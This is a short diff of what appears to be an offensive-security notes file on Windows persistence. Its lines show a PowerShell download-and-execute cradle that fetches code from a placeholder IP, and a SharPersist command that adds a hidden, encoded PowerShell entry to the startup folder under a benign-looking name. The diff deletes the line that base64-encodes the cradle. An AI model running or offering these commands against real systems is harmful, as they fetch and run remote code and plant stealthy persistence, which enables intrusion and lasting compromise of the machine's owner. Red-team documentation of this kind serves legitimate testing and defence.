@@ -16,7 +16,7 @@
 - Download an execute cradle as persistence
 ```
 str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
-echo -en $str | iconv -t UTF-16LE | base64 -w 0
+
 SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -f "UserEnvSetup" -m add
 ```
 
